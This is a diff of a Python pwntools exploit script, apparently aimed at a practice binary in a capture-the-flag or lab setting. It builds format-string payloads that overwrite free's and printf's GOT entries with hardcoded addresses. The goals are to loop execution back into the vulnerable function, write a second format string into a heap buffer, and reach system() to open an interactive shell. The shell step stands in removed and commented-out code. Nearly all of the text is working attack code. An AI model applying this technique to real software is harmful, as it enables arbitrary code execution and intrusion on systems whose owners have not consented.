@@ -159,13 +159,8 @@ c
 # # calling fgets
 # b *0x080485bf
 
-# at vuln malloc
-b *0x080485a0
-
 b *exit
 b *printf
-b *malloc
-b *fgets
 
 # c
 # finish
@@ -211,19 +206,14 @@ if LOCAL:
 else:
     remote_gdb_script_path = "/tmp/gdb"
 
-# after 14 is initialized as local var
-vuln_adr = 0x0804859a
+vuln_after_malloc = 0x080485a8
 free_got = 0x0804a010
 printf_got = 0x804a00c
 system_adr = 0xf7e0b040
 fs_payload_size = 0x13
-malloc_arg_p = 0xffffde18
-
-# heap_fs_buf_adr = 0x804b1a0
+reduced_fs_payload_size = 0x12
+heap_fs_buf_adr = 0x804b1a0
 #  "%1002x%x%1232xZZ"
-
-# malloc ret adrs:
-# 0x804b1a0
 
 log.info(
     "############################################################################################################################################################")
@@ -260,21 +250,24 @@ log.info(
 
 # printf arg pointer = 0xffffddec
 
-def create_payload():
+def create_payload(amount_heap_writes):
     payload = b""
     payload += b"A"
     payload += b"B"
     payload += pack(free_got, 32)
-    payload += pack(malloc_arg_p, 32)
-    payload += pack(printf_got, 32)
-    payload += pack(printf_got+2, 32)
-    payload += pack(printf_got+2, 32)
-    payload += pack(printf_got+2, 32)
+    # heap part
+    heap_fs_buf_end_adr = heap_fs_buf_adr + 0x13
+    for i in range(amount_heap_writes, 0, -1):
+        log.info(f"heap end off: {i}")
+        adr = heap_fs_buf_end_adr+i*2
+        log.info("heap adr: " + hex(adr))
+        payload += pack(adr, 32)
+        # payload += pack(adr, 32)
     payload += b"DDD"
     return payload
 
 
-payload = create_payload()
+payload = create_payload(7+1)
 init_and_upload_payload(payload)
 
 
@@ -310,7 +303,7 @@ def find_off_until_payload(target_value):
             return i
 
 
-def create_fs_paylad(padding, target, h=False, limit_pad=True):
+def create_fs_paylad(padding, target, h=False):
     format_payload = b""
     format_payload += b"%" + to_ascii_bytes(
         padding
@@ -324,20 +317,17 @@ def create_fs_paylad(padding, target, h=False, limit_pad=True):
         format_payload += b"%" + to_ascii_bytes(
             target
         ) + b"$n"
-    if limit_pad:
-        assert len(format_payload) <= 0x13
-        return pad(format_payload, fs_payload_size)
-    else:
-        return format_payload
+    assert len(format_payload) <= 0x13
+    return pad(format_payload, fs_payload_size)
 
 
 off_until_payload = find_off_until_payload(b"0x804a010")
 # always stays the same (aslr disabled)
-# off_until_payload = 117
+# off_until_payload = 120
 # exit(1)
 log.info(
     "############################################################################################################################################################")
-log.info("# overwrite free's got to point to vuln")
+log.info("# overwrite free's got to point to vuln after malloc")
 log.info(
     "############################################################################################################################################################")
 
@@ -350,7 +340,7 @@ log.info(
 # example fs
 # %2044x%10$hn%38912x%11$hn
 
-format_payload = create_fs_paylad(vuln_adr, off_until_payload)
+format_payload = create_fs_paylad(vuln_after_malloc, off_until_payload)
 
 log.info(f"format_payload: {format_payload}")
 log.info(f"format_payload len: {len(format_payload)}")
@@ -366,21 +356,57 @@ r = io.recv()
 log.info("done receiving")
 
 log.info("############################################################################################################################################################")
-log.info("# overwrite malloc size var")
+log.info("# update second half of heap_fs_buf")
 log.info("############################################################################################################################################################")
-new_malloc_size = 0x100
-format_payload = create_fs_paylad(new_malloc_size, off_until_payload+2)
-
-log.info(f"format_payload: {format_payload}")
-log.info(f"format_payload len: {len(format_payload)}")
 
 
-append_to_remote_file(s, format_payload, remote_format_payload_path)
+def string_to_string_num(s):
+    number = ""
+    for c in s:
+        number += hex(ord(c))
+        # log.info(f"number: {number}")
+    return number.replace("0x", "")
 
-io = execute()
-io.send(format_payload)
-r = io.recv()
-log.info("done receiving")
+
+def string_to_num(s):
+    return int("0x" + string_to_string_num(s), 16)
+
+
+def write_heap_fs(payload):
+    assert len(payload) % 2 == 0
+    n = 2
+    count = 2
+    p = payload[::-1]
+    parts = [p[i:i + n] for i in range(0, len(p), n)]
+    for part in parts:
+        log.info(f"parts: {part}")
+        format_payload_num = string_to_num(part)
+        format_payload = create_fs_paylad(format_payload_num, off_until_payload + count, h=True)
+        log.info(f"format_payload (second part): {format_payload}")
+        log.info(f"format_payload len: {len(format_payload)}")
+        log.info(f"format_payload_num: {format_payload_num}")
+        append_to_remote_file(s, format_payload, remote_format_payload_path)
+        io = execute()
+        io.send(format_payload)
+        r = io.recv()
+        log.info("done receiving")
+        count += 2
+
+# fs payload: #####################################
+format_payload = ""
+format_payload = "%1002x%x%1232xZZ"
+# format_payload += "%"+str(
+#     0x1234
+# ) + "x"
+# format_payload += "%" + str(
+#     off_until_payload+2
+# ) + "$n"
+
+
+# write fs payload ####################################
+write_heap_fs(format_payload)
+
+
 
 
 log.info("############################################################################################################################################################")
@@ -391,36 +417,71 @@ log.info("######################################################################
 %4158697536x%119$nX
 '''
 
-# 0xf7e0 b040
-format_payload = create_fs_paylad(0xb040, off_until_payload+4, h=True, limit_pad=False)
-format_payload += create_fs_paylad(0xf7e0-0xb040, off_until_payload+6, h=True, limit_pad=False)
-format_payload = pad(format_payload, new_malloc_size-1)
-
-log.info(f"format_payload: {format_payload}")
-log.info(f"format_payload len: {len(format_payload)}")
-
-
-append_to_remote_file(s, format_payload, remote_format_payload_path)
-
-io = execute()
-io.send(format_payload)
-r = io.recv()
-log.info("done receiving")
-
-
-
-
-
-log.info("############################################################################################################################################################")
-log.info("# send /bin/sh to execute shell")
-log.info("############################################################################################################################################################")
-
-
-format_payload = pad(b"sh\n", new_malloc_size-1)
-append_to_remote_file(s, format_payload, remote_format_payload_path)
+# 0xe0b040 80 will be written to got -> 0xf7e1a060 -> 0xf7e 0b040; 08..and got next to
+# printf got is free.got and will be unharmed bc 0x08048593 will be there and
+# 0x080 is the start of free.got at that time
+# system_adr_bytes = 0xe0b04008
+#
+# format_payload = b""
+# format_payload += b"%"+to_ascii_bytes(
+#     system_adr_bytes
+# ) + b"x"
+#
+# format_payload += b"%" + to_ascii_bytes(
+#     off_until_payload+2
+# ) + b"$n"
+#
+# format_payload = pad(format_payload, fs_payload_size)
+#
+# log.info(f"format_payload2: {format_payload}")
+# log.info(f"format_payload2 len: {len(format_payload)}")
+#
+# append_to_remote_file(s, format_payload, remote_format_payload_path)
+#
+#
+# io.send(format_payload)
+# r = io.recv()
+# log.info("done receiving")
 
 
-io.send(format_payload)
-io.interactive()
+# log.info("############################################################################################################################################################")
+# log.info("# update printf to system 2")
+# log.info("############################################################################################################################################################")
+#
+# system_adr_last_two_bytes = 0xf7e0
+#
+#
+# format_payload = b""
+# format_payload += b"%"+to_ascii_bytes(
+#     system_adr_last_two_bytes
+# )+b"x"
+#
+# format_payload += b"%" + to_ascii_bytes(
+#     off_until_payload+2
+# ) + b"$n"
+#
+# format_payload = pad(format_payload, fs_payload_size)
+#
+# log.info(f"format_payload2: {format_payload}")
+# log.info(f"format_payload2 len: {len(format_payload)}")
+#
+# append_to_remote_file(s, format_payload, remote_format_payload_path)
+#
+#
+# io.send(format_payload)
+# r = io.recv()
+# log.info("done receiving")
 
-# printf makes free point to system and ebp-c point to /bin/sh pointer
+
+#
+# log.info("############################################################################################################################################################")
+# log.info("# send /bin/sh to execute shell")
+# log.info("############################################################################################################################################################")
+
+
+# format_payload = pad(b"sh\n", fs_payload_size)
+# append_to_remote_file(s, format_payload, remote_format_payload_path)
+#
+#
+# io.send(format_payload)
+# io.interactive()
